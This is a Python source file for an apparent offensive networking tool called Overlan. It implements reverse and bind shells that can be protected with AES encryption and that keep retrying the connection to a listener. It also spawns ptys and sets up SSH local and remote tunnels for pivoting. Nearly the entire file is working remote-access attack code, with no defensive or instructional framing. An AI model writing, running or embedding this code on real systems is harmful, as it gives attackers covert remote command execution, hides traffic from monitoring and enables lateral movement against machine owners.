import socket
import os
from subprocess import Popen
from subprocess import PIPE
import time
from multiprocessing import set_start_method
from multiprocessing import Process
from multiprocessing import active_children
from threading import Thread
import signal
import sys
import argparse
import io
import paramiko
import getpass
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
import base64
import threading
import select


try:
    import SocketServer
except ImportError:
    import socketserver as SocketServer


try:
    import pty 
except ImportError:
    pass




###########################################################################

###### AES encryption function


key_bytes = 32

salt = b'K\xbb\xf0\xfb\xa0aq\x11'


def encrypt(pwd, msg):

    try:
        msg = msg.encode("utf-8", errors="ignore")

    except:
        pass

    key = PBKDF2(pwd, salt, key_bytes)

    key = base64.urlsafe_b64encode(key)

    cipher = AES.new(key[:key_bytes], AES.MODE_EAX)

    nonce = cipher.nonce

    e, tag = cipher.encrypt_and_digest(msg)

    r = tag + nonce + e

    return base64.b64encode(r)

def decrypt(pwd, msg):

    msg = base64.b64decode(msg)

    tag = msg[:16]

    nonce = msg[16:32]

    e = msg[32:]

    key = PBKDF2(pwd, salt, key_bytes)

    key = base64.urlsafe_b64encode(key)
    
    cipher = AES.new(key[:key_bytes], AES.MODE_EAX, nonce=nonce)

    d = cipher.decrypt(e)

    try:
        cipher.verify(tag)
        
        return d.decode("utf-8", errors="ignore")

    except ValueError:

        return ""

###########################################################################

###### SSH Forward Tunneling

g_verbose = True


class ForwardServer(SocketServer.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True


class HandlerL(SocketServer.BaseRequestHandler):
    def handle(self):
        try:
            chan = self.ssh_transport.open_channel(
                "direct-tcpip",
                (self.chain_host, self.chain_port),
                self.request.getpeername(),
            )
        except Exception as e:
            verbose(
                "[+] Incoming request to %s:%d failed: %s"
                % (self.chain_host, self.chain_port, repr(e))
            )
            return
        if chan is None:
            verbose(
                "[+] Incoming request to %s:%d was rejected by the SSH server."
                % (self.chain_host, self.chain_port)
            )
            return

        verbose(
            "[+] Connected!  Tunnel open %r -> %r -> %r"
            % (
                self.request.getpeername(),
                chan.getpeername(),
                (self.chain_host, self.chain_port),
            )
        )
        while True:
            r, w, x = select.select([self.request, chan], [], [])
            if self.request in r:
                data = self.request.recv(1024)
                if len(data) == 0:
                    break
                chan.send(data)
            if chan in r:
                data = chan.recv(1024)
                if len(data) == 0:
                    break
                self.request.send(data)

        peername = self.request.getpeername()
        chan.close()
        self.request.close()
        verbose("[+] Tunnel closed from %r" % (peername,))


def forward_tunnel(local_port, remote_host, remote_port, transport):
    
    class SubHander(HandlerL):
        chain_host = remote_host
        chain_port = remote_port
        ssh_transport = transport

    ForwardServer(("", local_port), SubHander).serve_forever()


def handlerR(chan, host, port):
    sock = socket.socket()
    try:
        sock.connect((host, port))
    except Exception as e:
        verbose("[+] Forwarding request to %s:%d failed: %r" % (host, port, e))
        return

    verbose(
        "[+] Connected!  Tunnel open %r -> %r -> %r"
        % (chan.origin_addr, chan.getpeername(), (host, port))
    )
    while True:
        r, w, x = select.select([sock, chan], [], [])
        if sock in r:
            data = sock.recv(1024)
            if len(data) == 0:
                break
            chan.send(data)
        if chan in r:
            data = chan.recv(1024)
            if len(data) == 0:
                break
            sock.send(data)
    chan.close()
    sock.close()
    verbose("[+] Tunnel closed from %r" % (chan.origin_addr,))


def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):
    transport.request_port_forward("", server_port)
    while True:

        
        chan = transport.accept(1000)
        
        if chan is None:
            continue
        
        p = threading.Thread(target=handlerR, args=(chan, remote_host, remote_port))
        p.daemon=True
        p.start()


def verbose(s):
    if g_verbose:
        print(s)




###########################################################################

class Overlan:


    
    def __init__(self, username=None, hostname=None, port=None, password=None):
            
        self.buffer = 1024*128

        self.username = username
        self.hostname = hostname
        self.port = port
        self.password = password

    
    
    def listen(self, port, host="127.0.0.1", executable=False, key=None, delay=0.6):

        """

        Listen on specified port and host. Optionaly, enable unbreakable password protected bind shell.

        :param port: Listener port
        :param host: (Optional) Listener host -  Defaut:localhost
        :param executable: (Optional) ["/bin/bash", or "cmd.exe", ...] Enable bind shell.  Defaut:None
        :param key: (Optional) Use with executable. Secret for bind shell. Defaut:None
        :param delay: (Optional) Timeout delay. Defaut:1

        """
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        s.settimeout(None)

        s.bind((host, port))
    
        s.listen(1)

        print(f"[*] Listening as {host}:{port}")

        while True:

            c, a = s.accept()
            
            
            if executable == False:

                print(f"[+] {a} is connected.")         
                
                while True:

                    c.settimeout(delay)
                    
                    try:
                        ans = c.recv(self.buffer).decode("utf-8", errors="ignore")
                    
                    except:
                        ans = ""

                    c.settimeout(None)
                    
                    if key and ans != "":
                        ans = decrypt(key, ans.encode("utf-8", errors="ignore"))
                        print(ans, end= " ")
                    
                    elif key:
                        print("", end= " ")
                    
                    else:
                        print(ans[:len(ans)-1], end= " ")
                    
                    cmd = input("")

                    cmd += "\n"
                    
                    if key:
                        c.send(encrypt(key, cmd))
                    
                    else:
                        c.send(cmd.encode("utf-8", errors="ignore"))
    
                    time.sleep(delay)
            
            else:
                
                ans = c.recv(self.buffer).decode("utf-8", errors="ignore")

                if key:
                    c.send(encrypt(key, "\n"))
                
                else:
                    c.send(b"\n")

                for child in active_children():    
                
                    child.terminate()
                
                t = Process(target=self.execute, kwargs={"c":c, "executable":executable,  "key":key})
                t.daemon = True
                t.start()


    def connect(self, host, port, executable=False, key=None, delay=0.6):

        """
        
        Connect to host and port specified. Optionaly enable unbreakable password protected reverse shell. 

        :param host: listener host
        :param port: listener port
        :param executable: (Optional) ["/bin/bash", "cmd.exe"] Enable reverse shell. Defaut:False. 
        :param key: (Optional) Use with executable. Secret for reverse shell. Defaut:None
        :param delay: (Optional) Timeout delay. Defaut:1

        """


        while True:

            try:

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                s.settimeout(None)
                
                s.connect((host, port))
               
                if key:
                    s.send(encrypt(key, "\n"))
                
                else:
                    s.send(b"\n")
                
                s.recv(self.buffer).decode("utf-8", errors="ignore")
                

                for child in active_children():    
                
                    child.terminate()

                if executable == False:
                    
                    print(f"[+] Connected to {host}:{port}")
                    
                    while True:
                        
                        cmd = input("")

                        cmd += "\n"
                        
                        if key:
                            s.send(encrypt(key, cmd))

                        else:
                            s.send(cmd.encode("utf-8", errors="ignore"))
       
                        time.sleep(delay)
                        
                        s.settimeout(delay)
                        
                        try:
                            ans = s.recv(self.buffer).decode("utf-8", errors="ignore")
                        
                        except:
                            ans = ""
                        
                        s.settimeout(None)
                                            
                        if key and ans != "":
                            ans = decrypt(key, ans.encode("utf-8", errors="ignore"))
                            print(ans, end= " ")
                        
                        elif key:
                            print("", end= " ")

                        else:
                            print(ans[:len(ans)-1], end= " ")

                else:
                    
                    t = Process(target=self.execute, kwargs={"c":s, "executable":executable, "key":key})
                    t.daemon = True
                    t.start()
            except:

                time.sleep(4)





    def execute(self, c, executable, key=None):


        """
        
        Execute command

        :param c: socket object
        :param executable: "/bin/bash" or "cmd.exe" or another shell
        :param key: (Optional) Secret

        """


        os.chdir(os.path.expanduser("~"))
        
        username = getpass.getuser()
        
        hostname = socket.gethostname()

        while True:
            
            try:
                
                if key:
                    c.send(encrypt(key, "\n"))  

                else:
                    c.send(b"\n")

                cmd = c.recv(self.buffer).decode("utf-8", errors="ignore")

                if key:
                    cmd = decrypt(key, cmd.encode("utf-8", errors="ignore"))
            
            except:
                                
                cmd = None
            
            if not cmd or cmd == "":

                time.sleep(5)
            
            elif cmd.strip() == "cd":

                try:
                    os.chdir(os.path.expanduser("~"))
                except:
                    pass
                
                cwd = username + "@" + hostname + ":~" +  os.getcwd() + " $"
                
                if key:
                    if sys.platform.startswith("win"): 
                        cwd = username + ":" + hostname + ":" +  os.getcwd() + ":"
                    c.send(encrypt(key, "\n" + cwd))
                
                else:
                    c.send(b"\n" + cwd.encode("utf-8", errors="ignore"))
                
                
            elif cmd[:3] == "cd ":
        
                cmd = cmd.replace("\n", "")

                try:
                    os.chdir(cmd[3:])
                except:
                    pass
                
                cwd = username + "@" + hostname + ":~" +  os.getcwd() + " $"

                if key:
                    if sys.platform.startswith("win"): 
                        cwd = username + ":" + hostname + ":" +  os.getcwd() + ":"
                    c.send(encrypt(key,"\n" + cwd))
                    
                else:
                    c.send(b"\n" + cwd.encode("utf-8", errors="ignore"))

            else:

                if executable == "cmd.exe":

                    cmd = cmd.replace("\n", "")

                    x = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            
                    if key:

                        cwd = username + ":" + hostname + ":" +  os.getcwd() + ":"
                        
                        out = x.stdout.read()
                        
                        err = x.stderr.read()

                        if out != b'':
                            
                            z = out + cwd.encode("utf-8", errors="ignore")
                            
                        elif err != b'':

                            z = err + cwd.encode("utf-8", errors="ignore")
                            
                        else:

                            z = cwd.encode("utf-8", errors="ignore")
                        
                        z = encrypt(key, z)
                        
                        c.send(z)

                    else:
                        
                        cwd = "\n" + username + "@" + hostname + ":~" +  os.getcwd() + " $"
                        
                        c.sendall(x.stdout.read() + x.stderr.read() + cwd.encode("utf-8", errors="ignore"))


                elif executable[:4] == "pty:":
                    
                    os.dup2(c.fileno(), 0)
                    os.dup2(c.fileno(), 1)
                    os.dup2(c.fileno(), 2)
                    pty.spawn(executable[4:])


                else:

                    x = Popen(executable, stdout=PIPE, stdin=PIPE, stderr=PIPE, shell=True)
                
                    cmd = cmd.encode("utf-8", errors="ignore")

                    x.stdin.write(cmd)

                    x.stdin.close()

                    if key:
                        
                        cwd = username + "@" + hostname + ":~" +  os.getcwd() + " $"
                        
                        out = x.stdout.read()
                        
                        err = x.stderr.read()

                        if out != b'':
                            
                            z = out + b"\n" + cwd.encode("utf-8", errors="ignore")
                            
                        elif err != b'':

                            z = err + b"\n" + cwd.encode("utf-8", errors="ignore")
                            
                        else:

                            z = cwd.encode("utf-8", errors="ignore")

                        z = encrypt(key, z)

                        c.send(z)

                    else:

                        cwd = "\n" + username + "@" + hostname + ":~" +  os.getcwd() + " $"
                        
                        c.sendall(x.stdout.read() + x.stderr.read() + cwd.encode("utf-8", errors="ignore"))
                        

    def lf_tunnel(self, local_port, remote_port, remote_host="0.0.0.0"):


        """
        
        Local tunnel

        :param local_port: Port local sur lequel vous sohaitez forwarder le service distant
        :param remote_port: Port distant depuis lequel vous souhaitez forawarder le service distant
        :param remote_host: (Optional) Host distant sur lequel tourne le service. Defaut:0.0.0.0

        """

        transport = paramiko.Transport((self.hostname, self.port))

        transport.connect(
            hostkey  = None,
            username = self.username,
            password = self.password,
            pkey = None)

        forward_tunnel(local_port, remote_host, remote_port, transport)


    def rf_tunnel(self, local_port, remote_port, remote_host="localhost"):

        """
        
        Remote tunnel

        :param local_port: Port local sur lequel tourne le service que vous sohaitez forwarder vers le server distant
        :param remote_port: Port distant vers lequel vous souhaitez forawarder le service local
        :param remote_host: (Optional) Host distant. Defaut:localhost

        """

        ssh = paramiko.SSHClient()

        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        ssh.connect(
            username = self.username,
            hostname = self.hostname,
            port = self.port,
            password = self.password)

        transport = ssh.get_transport()

        reverse_forward_tunnel(remote_port, remote_host, local_port, transport)


    def rs(self, host, port, executable, key=None, delay=0.6):

        """
        Threaded Reverse shell

        :param host: listener host
        :param port: listener port
        :param executable: ["/bin/bash", "cmd.exe"] 
        :param key: (Optional) Use with executable. Secret for reverse shell. Defaut:None

        """

        rs = Thread(target=self.connect, kwargs={"host":host, "port":port, "executable":executable, "key":key, "delay":delay})
        rs.start()


    def bs(self, port, executable, key=None, delay=0.6):

        """
        Threaded Bind shell

        :param port: Listener port
        :param executable: ["/bin/bash", or "cmd.exe", ...]
        :param key: (Optional) Use with executable. Secret for bind shell. Defaut:None
        :param delay: (Optional) Timeout delay. Defaut:1

        """

        bs = Thread(target=self.listen, kwargs={"port":port, "executable":executable, "key":key, "delay":delay})
        bs.start()


    def lf(self, local_port, remote_port, remote_host="localhost"):
        
        """
        Processed Local tunnel

        :param local_port: Port local sur lequel vous sohaitez forwarder le service distant
        :param remote_port: Port distant depuis lequel vous souhaitez forawarder le service distant
        :param remote_host: (Optional) Host distant sur lequel tourne le service. Defaut:0.0.0.0
        
        """

        lf = Process(target=self.lf_tunnel, kwargs={"local_port":local_port, "remote_port":remote_port, "remote_host":remote_host})
        lf.start()


    def rf(self, local_port, remote_port, remote_host="localhost"):
        
        """
        Processed Remote tunnel

        :param local_port: Port local sur lequel tourne le service que vous sohaitez forwarder vers le server distant
        :param remote_port: Port distant vers lequel vous souhaitez forawarder le service local
        :param remote_host: (Optional) Host distant. Defaut:localhost
        
        """

        rf = Process(target=self.rf_tunnel, kwargs={"local_port":local_port, "remote_port":remote_port, "remote_host":remote_host})
        rf.start()



def main():

    set_start_method("spawn") 
    
    parser = argparse.ArgumentParser()

    parser.add_argument("host", nargs='?', default="127.0.0.1")

    parser.add_argument("port", type=int)

    parser.add_argument("-l", "--listen",
                        action="store_true",
                        help="Listen on port specified")

    parser.add_argument("-e", "--execute",
                        help="Executable: /bin/bash, /bin/sh, cmd.exe")

    parser.add_argument("-c", "--connect",
                        action="store_true",
                        help="Connect to host and port specified")

    parser.add_argument("-R", "--remote", help="Remote forward to <username>:<host>:<port>:<password>:<remote_port>") 

    parser.add_argument("-L", "--local", help="Local forward from <username>:<host>:<port>:<password>:<remote_port>")

    parser.add_argument("-k", "--key", help="Password for AES derivation key")

    parser.add_argument("-d", "--delay", type=float, help="Timeout delay")
    
    args = parser.parse_args()



    if args.remote:

        x = args.remote

        x = x.split(":")

        prt = Overlan(username=x[0], hostname=x[1], port=int(x[2]), password=x[3])

        remote_port = int(x[4])

    elif args.local:

        x = args.local

        x = x.split(":")

        prt = Overlan(username=x[0], hostname=x[1], port=int(x[2]), password=x[3])

        remote_port = int(x[4])

    else:
    
        prt = Overlan()


    if args.key:
        key = args.key
    else:
        key = None

    if args.delay:
        delay = args.delay
    else:
        delay = 0.5

    if args.listen:
       
        if args.execute and not args.remote:
            
            # bind shell local

            prt.bs(args.port, args.execute, key=key)

        elif args.execute and args.remote:
            
            # bind shell remote forwarded

            prt.bs(args.port, args.execute, key=key)
            prt.rf_tunnel(args.port, remote_port)
            

        elif not args.execute and not args.remote:
            
            # local listener

            prt.listen(args.port, delay=delay, key=key)

        elif not args.execute and args.remote:
            
            
            #prt.listen(args.port)
            prt.bs(args.port, False, delay=delay, key=key)
            # remote forwarde listener
            prt.rf_tunnel(args.port, remote_port)
    
    else:

        if args.execute:

            # reverse shell

            prt.rs(args.host, args.port, args.execute, key=key)

        elif not args.execute and not args.remote and not args.local:

            # connect to listener or bind shell

            prt.connect(args.host, args.port, delay=delay, key=key)

        elif not args.execute and args.local:
            
            # connect to listener or bind shell local forwarded

            prt.rs(args.host, args.port, False, delay=delay, key=key)
        
            prt.lf_tunnel(args.port, remote_port)
        
        elif args.remote:

            prt.rf_tunnel(args.port, remote_port)

        elif args.local:
            
            prt.lf(args.port, remote_port)

#if __name__ == "__main__":

    #main()
